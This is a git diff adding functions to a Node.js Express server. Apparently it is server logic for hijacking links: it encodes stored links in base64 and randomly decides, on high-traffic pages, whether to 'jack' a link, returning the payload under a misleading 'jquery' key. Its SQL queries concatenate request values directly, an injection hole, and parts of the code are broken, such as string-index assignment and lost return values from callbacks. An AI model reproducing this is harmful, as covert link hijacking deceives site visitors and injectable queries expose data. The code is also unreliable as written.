@@ -6,7 +6,6 @@ var express = require('express')
   , path = require('path');
 var app = express();
 var request = require('request');
-
 //var compressor = require('yuicompressor');
 var validator = require('validator');
 var bcrypt = require('bcrypt-nodejs');
@@ -87,6 +86,65 @@ function checkAuth(req, res, next) {
     } else {
         next();
     }
+}
+
+function getNextCodeDelimiter() {
+  var code = "aixlfgixgfe";
+  var newCode = "";
+  
+  for(var i=0 ; i<code.length; i++) {
+    if(code.charAt(i) > 122) {
+      newCode[i] = 97;
+    } else {
+      newCode[i] = code[i] + 1;
+    }
+  }
+  console.log(newCode);
+  return newCode;
+} 
+
+function getClientResponseJSON(uuid, url) {
+  /* 1.get the links from the lander_info based on the uuid */
+  connection.query("select links_list from lander_info where uuid='" + uuid + "'", function(err, docs) {
+    if(docs.length == 1) {
+      var links = docs[0].links_list;
+      var linksArr = links.split(",");
+      var response = "";
+
+      /* 2. transform that into base64 code */
+      for(var i=0 ; i<linksArr.length ; i++) {
+        response += new Buffer(linksArr[i]).toString('base64') + getNextCodeDelimiter();
+      }
+
+      /* 3. get the rate from pulse table based on url */
+      connection.query("select rate from pulse where url = '" + url +"'", function(err, docs) {
+        if(docs.length ==1) {
+          //get random number, if its above 15 dont jack, otherwise jack
+          var randomNumber = Math.random() * 100;
+          if(docs[0].rate > 30) { //views/min
+            if(randomNumber <= 15) {
+                return {
+                    jquery: response
+                }
+            } else {
+                return {
+                    jquery: false
+                }
+            }
+          }
+        } else {
+            //dont jack
+        }
+      });
+
+    } else {
+      //error, no jack, log
+      console.log('error determining whether or not to jack link');
+      return { 
+        jquery: false
+      };
+    }
+  });
 }
 
 function checkAdmin(req, res, next) {
